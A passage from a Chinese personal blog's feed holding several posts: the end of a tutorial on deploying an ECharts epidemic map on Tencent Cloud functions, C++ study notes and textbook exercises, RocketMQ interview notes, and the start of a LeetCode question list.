class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 5. 添加数据分段</span></span><br><span class="line">pieces: [</span><br><span class="line">    &#123; <span class="attr">min</span>: <span class="number">10000</span>, <span class="attr">label</span>: <span class="string">'10000人及以上'</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">min</span>: <span class="number">1000</span>, <span class="attr">max</span>: <span class="number">9999</span>, <span class="attr">label</span>: <span class="string">'1000-9999人'</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">min</span>: <span class="number">500</span>, <span class="attr">max</span>: <span class="number">999</span>, <span class="attr">label</span>: <span class="string">'500-999人'</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">min</span>: <span class="number">100</span>, <span class="attr">max</span>: <span class="number">499</span>, <span class="attr">label</span>: <span class="string">'100-499人'</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">min</span>: <span class="number">10</span>, <span class="attr">max</span>: <span class="number">99</span>, <span class="attr">label</span>: <span class="string">'10-99人'</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">min</span>: <span class="number">1</span>, <span class="attr">max</span>: <span class="number">9</span>, <span class="attr">label</span>: <span class="string">'1-9人'</span> &#125;</span><br><span class="line">],</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 6. 填写疫情地图的数据及悬浮框的展示信息</span></span><br><span class="line">series: [</span><br><span class="line">  &#123;</span><br><span class="line">    name: <span class="string">'确诊病例'</span>,</span><br><span class="line">    type: <span class="string">'map'</span>,</span><br><span class="line">    roam: <span class="literal">true</span>,</span><br><span class="line">    map: <span class="string">'china'</span>,</span><br><span class="line">    label: &#123;</span><br><span class="line">      show: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    emphasis: &#123;</span><br><span class="line">      label: &#123;</span><br><span class="line">        show: <span class="literal">true</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    data: confirmData</span><br><span class="line">  &#125;</span><br><span class="line">];</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 7. 定时拉取</span></span><br><span class="line">setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  updateMap();</span><br><span class="line">&#125;, <span class="number">60000</span>);</span><br></pre></td></tr></table></figure><p>需要简单说明的是，该模板是使用了<code>EChart</code>的模板进行改造，模板地址如下：<a href="https://www.echartsjs.com/examples/zh/editor.html?c=map-usa" target="_blank" rel="noopener">https://www.echartsjs.com/examples/zh/editor.html?c=map-usa</a>，下图是模板的效果。你也可以点击该模板右下角的<code>Download</code>按钮将模板的<code>html</code>文件下载下来，然后按自己的喜欢进行编辑改造。</p><p><img src="https://user-images.githubusercontent.com/3348398/73943593-fae5b180-492b-11ea-859e-bdb0f49e3cde.png" alt="疫情地图的模板"></p><p>完成模板的改造后，请用插件或者命令行工具，上传云函数。下图是通过<code>VS Code</code>插件上传云函数的示例：</p><p><img src="https://user-images.githubusercontent.com/3348398/73943865-819a8e80-492c-11ea-9bb1-969220c13b3b.png" alt="通过`VS Code`插件上传云函数"></p><h2><span id="任务三-创建-api-网关触发器">任务三 创建 API 网关触发器</span></h2><p>进入控制台，找到云函数的控制台，并选择云函数所在的地区以及命名空间，然后进入云函数的编辑界面，选择触发方式菜单，然后点击“添加触发方式”，按以下的内容添加一个 API 网关触发器。注意，请务必勾选“启用集成响应”，这样网关才能正确渲染<code>HTML</code>的内容。</p><p><img src="https://user-images.githubusercontent.com/3348398/73863542-37a5a000-487b-11ea-9961-ecd34f709f6b.png" alt="添加API网关触发器"></p><p>创建完毕后，可以 API 网关触发器中，拿到访问路径路径，在浏览器中进行访问。如果验证过没问题后，建议将云函数，通过<code>VS Code</code>插件同步下来，将旧的<code>template.yaml</code>文件替换掉，这样避免下次上传云函数的时候，生成重复的 API 网关触发器。只有像下面的<code>Events</code>触发事件那样，将系统生成的网关贴上去，才不会重复生成新的网关，造成资源浪费。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Events:</span></span><br><span class="line">  <span class="attr">service-8lqamcni:</span></span><br><span class="line">    <span class="attr">Type:</span> <span class="string">APIGW</span></span><br><span class="line">    <span class="attr">Properties:</span></span><br><span class="line">      <span class="attr">Enable:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">StageName:</span> <span class="string">release</span></span><br><span class="line">      <span class="attr">ServiceId:</span></span><br><span class="line">      <span class="attr">HttpMethod:</span> <span class="string">GET</span></span><br><span class="line">      <span class="attr">IntegratedResponse:</span> <span class="literal">true</span></span><br><span class="line"><span class="string">```</span></span><br></pre></td></tr></table></figure><p>体验地址：<a href="https://service-lltf3zya-1253970226.gz.apigw.tencentcs.com/release/demo_yiqing" target="_blank" rel="noopener">疫情地图体验</a></p><h2><span id="任务四-添加自定义域名">任务四 添加自定义域名</span></h2><p>如果觉得网关提供的域名过长，又或者担心这种域名由于安全问题会被微信等大平台封禁，可以自己自行配置自定义域名。首先，在云函数<code>yiqing</code>的控制台面板里，找到【触发方式】，然后点击任务三中添加过的触发器里的【API 服务名】，进入更详细的网关配置控制台。</p><p><img src="https://user-images.githubusercontent.com/3348398/74046219-1e325e80-4a09-11ea-9473-397b02e27821.png" alt="进入网关配置控制台"></p><p>进入【自定义域名】菜单，新建自定义域名，如果想配置 HTTPS 协议，则需要去申请 HTTPS 证书（腾讯云有免费的可以申请，可以跟着提示跳转到证书配置菜单）。</p><p><img src="https://user-images.githubusercontent.com/3348398/74046446-8c772100-4a09-11ea-92db-8e597dcf05b4.png" alt="自定义域名菜单"></p><p>可以按照下图的示例进行配置。要注意的是，如果想访问的路径更扁平化一点，请选择“自定义路径映射”，路径填入<code>/</code>，环境选择发布。如果不这样配置，如果原本网关的域名是<a href="https://service-lltf3zya-1253970226.gz.apigw.tencentcs.com/release/demo_yiqing" target="_blank" rel="noopener">https://service-lltf3zya-1253970226.gz.apigw.tencentcs.com/release/demo_yiqing</a>，那么配置好之后，访问的路径就是[<a href="https://yiqing.docschina.org/release/demo_yiqing]。但如果配置了`/`，那么后面的路径就只剩下`demo_yiqing`了。" target="_blank" rel="noopener">https://yiqing.docschina.org/release/demo_yiqing]。但如果配置了`/`，那么后面的路径就只剩下`demo_yiqing`了。</a></p><p><img src="https://user-images.githubusercontent.com/3348398/74046578-c21c0a00-4a09-11ea-846b-e1393e3f8106.png" alt="新建自定义域名"></p><p>在保存配置信息之前，请首先在域名解析服务商，根据弹窗的提示，先把域名的 CNAME 配置好。比如这里使用的是<a href="https://yiqing.docschina.org" target="_blank" rel="noopener">https://yiqing.docschina.org</a>，域名，提示要 CNAME 到<code>service-lltf3zya-1253970226.gz.apigw.tencentcs.com.</code>。做完 CNAME 后，就可以保存自定义域名的添加配置。稍等片刻，就可以访问了。</p><p><img src="https://user-images.githubusercontent.com/3348398/74046843-3b1b6180-4a0a-11ea-9a3c-daef71f701f1.png" alt="配置域名解析"></p><p>如果看到配置列表上显示“解析成功”，那表明一切的陪着已经妥当，请尝试访问：<a href="https://yiqing.docschina.org/demo_yiqing" target="_blank" rel="noopener">https://yiqing.docschina.org/demo_yiqing</a>进行体验吧！</p><p>````</p>]]></content>
      
      
      <categories>
          
          <category> log </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java2C++</title>
      <link href="/2020/04/18/Java2C/"/>
      <url>/2020/04/18/Java2C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>总结一些C++学习中疑惑的点</p><a id="more"></a><!-- toc --><ul><li><a href="#知识点">知识点</a><ul><li><a href="#const和指针">const和指针</a></li><li><a href="#constexpr">constexpr</a></li><li><a href="#数组">数组</a><ul><li><a href="#引用遍历法">引用遍历法：</a></li><li><a href="#下标遍历法">下标遍历法：</a></li><li><a href="#指针遍历法">指针遍历法：</a></li></ul></li><li><a href="#左值和右值">左值和右值</a></li><li><a href="#拷贝构造函数">拷贝构造函数</a></li><li><a href="#拷贝初始化">拷贝初始化</a></li><li><a href="#重载拷贝赋值运算符">重载拷贝赋值运算符</a></li></ul></li><li><a href="#练习">练习</a><ul><li><a href="#943">9.43</a></li><li><a href="#944">9.44</a></li></ul></li></ul><!-- tocstop --><h1><span id="知识点">知识点</span></h1><h2><span id="const和指针">const和指针</span></h2><ul><li><strong>指向常量的指针：</strong>不能用于改变其所指对象的值。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">double</span> pi=<span class="number">3.14</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">double</span> *p=&amp;pi;<span class="comment">//pi必须要用指向常量的指针指向</span></span><br><span class="line"><span class="keyword">double</span> dval=<span class="number">3.14</span>;</span><br><span class="line">p=&amp;dval; <span class="comment">//可以，但是不能使用p改变dval的值</span></span><br></pre></td></tr></table></figure><p><font color="red">存放常量对象的地址必须要使用指向常量的指针，</font></p><p><font color="blue">但是指向常量的指针也可以指向变量</font></p><ul><li><strong>const指针</strong>：常量指针必须初始化，常量指针指向的对象地址不可改变。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> *<span class="keyword">const</span> p=&amp;a; <span class="comment">//p将一直指向a</span></span><br><span class="line"><span class="keyword">const</span> doublie pi=<span class="number">3.14</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">double</span> *<span class="keyword">const</span> pip=&amp;pi; <span class="comment">//pip是指向常量对象的常量指针</span></span><br></pre></td></tr></table></figure><ul><li>顶层const：表示指针本身是个常量</li><li>底层const： 表示所指的对象是个常量</li></ul><p><font color="orange">指针指向对象，指针在顶层，对象在底层。</font></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> v1=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> *p1=&amp;v1;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> *p2=p1; <span class="comment">//对，因为int*可以转化为const int*</span></span><br><span class="line">p1=p2;            <span class="comment">//不对，因为p2是底层const，p1不是。</span></span><br></pre></td></tr></table></figure><p>当执行对象拷贝时，拷入拷出的对象必须具有相同的底层const资格。或者两个对象数据类型必须可以转换。<font color="red">非常量可以转换成常量，反之不行</font></p><p>底层指针的拷入主要看是否同为底层的或者是非常量。</p><p>常量指针的拷入只能拷入常量。</p><p>顶层指针因为只能初始化一次后不能改变所以不做讨论。</p><h2><span id="constexpr">constexpr</span></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> *p=<span class="literal">nullptr</span>; <span class="comment">//底层const</span></span><br><span class="line"><span class="keyword">constexpr</span> <span class="keyword">int</span> *q=<span class="literal">nullptr</span>;<span class="comment">//顶层const 相对于*const</span></span><br></pre></td></tr></table></figure><h2><span id="数组">数组</span></h2><h3><span id="引用遍历法">引用遍历法：</span></h3><p>要使用范围for语句处理多维数组，除了最内层的循环外，其他所有循环的控制变量都应该是引用类型。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> ia[row][col];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> &amp;row:ia)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> i:row)&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; i;  <span class="comment">//i只读，改变对数组没有影响。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是想要去更改数组里面的值就要使用引用类型去遍历</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> &amp;row:ia)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;col:row)&#123;</span><br><span class="line">        <span class="comment">//do something</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="下标遍历法">下标遍历法：</span></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> ia[row][col];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i!=row;++i)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> j=<span class="number">0</span>;j!=col;++j)&#123;</span><br><span class="line">        ia[i][j]=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>,*p=&amp;i;</span><br><span class="line">*p=<span class="number">2</span>;<span class="comment">//*p是i的一个引用，相对于&amp;j=i;</span></span><br></pre></td></tr></table></figure><h3><span id="指针遍历法">指针遍历法：</span></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> p=ia;p!=ia+<span class="number">3</span>;++p)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> q=*p;q!=*p+<span class="number">4</span>;++q)&#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中p中存放地址是ia[x]的地址而且ia[x]和ia[x+1]的地址是连续的，而*p是取ia[x][0]的地址。</p><h2><span id="左值和右值">左值和右值</span></h2><h2><span id="拷贝构造函数">拷贝构造函数</span></h2><p>如果一个构造函数的第一个参数是自身类类型的引用，且任何额外参数都有默认值，则此构造函数是拷贝构造函数。当使用<strong>拷贝初始化</strong>时，我们会用到拷贝构造函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Foo(); <span class="comment">//默认构造函数</span></span><br><span class="line">    Foo(<span class="keyword">const</span> Foo&amp;);<span class="comment">//拷贝构造函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>拷贝函数通常不应该是explicit的</strong></p><h2><span id="拷贝初始化">拷贝初始化</span></h2><ul><li><p>用=定义变量</p></li><li><p>将一个对象作为实参传递给一个非引用类型的形参</p></li><li><p>从花括号列表初始化一个数组中的元素或一个聚合类中的成员</p></li></ul><h2><span id="重载拷贝赋值运算符">重载拷贝赋值运算符</span></h2><p>如果一个类未定义自己的拷贝赋值运算符，编译器会为它生成一个合成拷贝赋值运算符</p><p>如果一个运算符是一个成员函数，其左侧运算对象就绑定到隐式的this参数。赋值运算符通常返回一个指向其左侧运算对象的引用。</p><h1><span id="练习">练习</span></h1><h2><span id="943">9.43</span></h2><p>如果使用!=来比较两个迭代器在这题是不行的，但是如果不是特殊条件最好写成！=的判断条件。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">replace</span><span class="params">(<span class="built_in">string</span>&amp; s, <span class="keyword">const</span> <span class="built_in">string</span>&amp; oldVal, <span class="keyword">const</span> <span class="built_in">string</span>&amp; newVal)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">auto</span> curr = s.<span class="built_in">begin</span>();</span><br><span class="line"><span class="keyword">while</span> (curr &lt;= s.<span class="built_in">end</span>() - oldVal.<span class="built_in">size</span>())</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (oldVal == s.substr(curr-<span class="built_in">begin</span>(s),  oldVal.<span class="built_in">size</span>()))</span><br><span class="line">&#123;</span><br><span class="line">curr = s.erase(curr, curr + oldVal.<span class="built_in">size</span>());</span><br><span class="line">curr = s.insert(curr, newVal.<span class="built_in">begin</span>(), newVal.<span class="built_in">end</span>());</span><br><span class="line">curr += newVal.<span class="built_in">size</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">++curr;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">string</span> s = <span class="string">"tho "</span>;</span><br><span class="line">    <span class="built_in">string</span> oldVal = <span class="string">"tho"</span>;</span><br><span class="line">    <span class="built_in">string</span> newVal = <span class="string">"though"</span>;</span><br><span class="line">replace(s, oldVal, newVal);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; s;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="944">9.44</span></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">replace</span><span class="params">(<span class="built_in">string</span>&amp; s, <span class="keyword">const</span> <span class="built_in">string</span>&amp; o, <span class="keyword">const</span> <span class="built_in">string</span>&amp; n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i+o.<span class="built_in">size</span>() &lt;= s.<span class="built_in">size</span>()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (o == s.substr(i,i+o.<span class="built_in">size</span>())) &#123;</span><br><span class="line">            s.replace(i, o.<span class="built_in">size</span>(), n);</span><br><span class="line">            i += n.<span class="built_in">size</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">string</span> s = <span class="string">"tho "</span>;</span><br><span class="line">    <span class="built_in">string</span> oldVal = <span class="string">"tho"</span>;</span><br><span class="line">    <span class="built_in">string</span> newVal = <span class="string">"though"</span>;</span><br><span class="line">replace(s, oldVal, newVal);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; s;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> log </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中间件</title>
      <link href="/2020/04/16/middleWare/"/>
      <url>/2020/04/16/middleWare/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>适用于面试回答</p><a id="more"></a><!-- toc --><ul><li><a href="#redis">Redis</a></li><li><a href="#mq">MQ</a><ul><li><a href="#消息队列优缺点">消息队列优缺点</a></li><li><a href="#为什么用rocketmq">为什么用RocketMQ</a></li><li><a href="#rocketmq如何保证高可用性">RocketMQ如何保证高可用性</a></li><li><a href="#rocketmq如何保证消息不被重复消费">RocketMQ如何保证消息不被重复消费</a></li><li><a href="#如何保证消息可靠性">如何保证消息可靠性</a></li></ul></li></ul><!-- tocstop --><h1><span id="redis">Redis</span></h1><h1><span id="mq">MQ</span></h1><h2><span id="消息队列优缺点">消息队列优缺点</span></h2><p><strong>优点</strong></p><p>​    解耦、削峰和异步</p><p><strong>缺点</strong></p><p>​    提升了系统的复杂度、系统可用性降低以及存在一致性的问题。</p><h2><span id="为什么用rocketmq">为什么用RocketMQ</span></h2><ul><li>吞吐量：ActiveMQ和RabbitMQ是万级，而RocketMQ和Kafka是十万级。</li><li>Topic： RocketMQ可以支持成百上千，而Kafka几十几百吞吐量大幅下降</li><li>时效性： 除了Rabbit都是ms级别</li><li>可用性：RocketMQ和Kafka都非常高</li><li>可靠性：RockMQ和Kafka可以做到不丢</li></ul><h2><span id="rocketmq如何保证高可用性">RocketMQ如何保证高可用性</span></h2><p>一个最基本的架构认识：由多个 broker 组成，每个 broker 是一个节点；你创建一个 topic，这个 topic 可以划分为多个 partition，每个 partition 可以存在于不同的 broker 上，每个 partition 就放一部分数据。</p><p>副本机制，每个 partition 的数据都会同步到其它机器上，形成自己的多个 replica 副本。所有副本会选取一个leader用来读写数据。如果leader down了，就重新选择leader。</p><p><strong>写数据</strong>的时候，生产者就写 leader，然后 leader 将数据落地写本地磁盘，接着其他 follower 自己主动从 leader 来 pull 数据。一旦所有 follower 同步好数据了，就会发送 ack 给 leader，leader 收到所有 follower 的 ack 之后，就会返回写成功的消息给生产者。</p><h2><span id="rocketmq如何保证消息不被重复消费">RocketMQ如何保证消息不被重复消费</span></h2><p>每个消息写进去，都有一个 offset，代表消息的序号，然后 消费者消费了数据之后，<strong>每隔一段时间</strong>就会提交 offset 。</p><p>如果重启怎么办？</p><ul><li>比如你拿个数据要写库，你先根据主键查一下，如果这数据都有了，你就别插入了，update 一下好吧。</li><li>比如你是写 Redis，那没问题了，反正每次都是 set，天然幂等性。</li><li>比如你不是上面两个场景，那做的稍微复杂一点，你需要让生产者发送每条数据的时候，里面加一个全局唯一的 id，消费到了之后，先根据这个 id 去比如 Redis 里查一下，之前消费过吗？如果没有消费过，你就处理，然后这个 id 写 Redis。如果消费过了，那你就别处理了，保证别重复处理相同的消息即可。</li><li>比如基于数据库的唯一键来保证重复数据不会重复插入多条。因为有唯一键约束了，重复数据插入只会报错，不会导致数据库中出现脏数据。</li></ul><h2><span id="如何保证消息可靠性">如何保证消息可靠性</span></h2>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 中间件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode高频考点</title>
      <link href="/2020/04/16/Hi-Freq/"/>
      <url>/2020/04/16/Hi-Freq/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>盘点了高频的面试题</p><a id="more"></a><!-- toc --><ul><li><a href="#数组">数组</a><ul><li><a href="#two-sum">Two Sum √</a></li><li><a href="#maximum-swap">Maximum Swap √</a></li><li><a href="#median-of-two-sorted-arrays">Median of Two Sorted Arrays</a></li><li><a href="#swap-adjacent-in-lr-string">Swap Adjacent in LR String</a></li></ul></li><li><a href="#链表">链表</a><ul><li><a href="#merge-k-sorted-lists-">Merge k Sorted Lists -</a></li><li><a href="#lru-">LRU -</a></li><li><a href="#reverse-nodes-in-k-group-">Reverse Nodes in K-group -</a></li><li><a href="#copy-list-with-random-pointer-">Copy List with Random Pointer -</a></li><li><a href="#merge-two-sorted-lists">Merge Two Sorted Lists √</a></li><li><a href="#add-two-numbers">Add Two Numbers √</a></li><li><a href="#add-two-numbers-ii">Add Two Numbers II √</a></li><li><a href="#reverse-words-in-a-string-">Reverse Words in a String -</a></li><li><a href="#merge-k-sorted-lists--1">Merge k Sorted Lists -</a></li></ul></li><li><a href="#动态规划">动态规划</a><ul><li><a href="#climbing-stairs">Climbing Stairs √</a></li></ul></li><li><a href="#栈">栈</a><ul><li><a href="#trapping-rain-water">Trapping Rain Water</a></li><li><a href="#simplify-path">Simplify Path</a></li></ul></li><li><a href="#二分查找">二分查找</a><ul><li><a href="#search-in-rotated-sorted-array">Search in Rotated Sorted Array √</a></li></ul></li><li><a href="#双指针">双指针</a><ul><li><a href="#longest-substring-without-repeating-characters">Longest Substring Without Repeating Characters √</a></li></ul></li><li><a href="#搜索">搜索</a><ul><li><a href="#longest-palindromic-substring">Longest Palindromic Substring ×</a></li></ul></li><li><a href="#动态规划-1">动态规划</a><ul><li><a href="#maximum-subarray">Maximum Subarray √</a></li><li><a href="#regular-expression-matching">Regular Expression Matching √</a></li></ul></li><li><a href="#排序">排序</a><ul><li><a href="#kth-largest-element-in-an-array">Kth Largest Element in an Array √</a></li></ul></li><li><a href="#数字">数字</a><ul><li><a href="#reverse-integer">Reverse Integer √</a></li><li><a href="#implement-rand10-using-rand7">Implement Rand10() Using Rand7()</a></li></ul></li></ul><!-- tocstop --><h1><span id="数组">数组</span></h1><h2><span id="two-sum">Two Sum √</span></h2><p>Given an array of integers, return <strong>indices</strong> of the two numbers such that they add up to a specific target.</p><p>You may assume that each input would have <strong><em>exactly\</em></strong> one solution, and you may not use the <em>same</em> element twice.</p><p><strong>Example:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Given nums &#x3D; [2, 7, 11, 15], target &#x3D; 9,</span><br><span class="line"></span><br><span class="line">Because nums[0] + nums[1] &#x3D; 2 + 7 &#x3D; 9,</span><br><span class="line">return [0, 1].</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        <span class="keyword">int</span> res[] =<span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2</span>];</span><br><span class="line">        HashMap&lt;Integer,Integer&gt; map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">            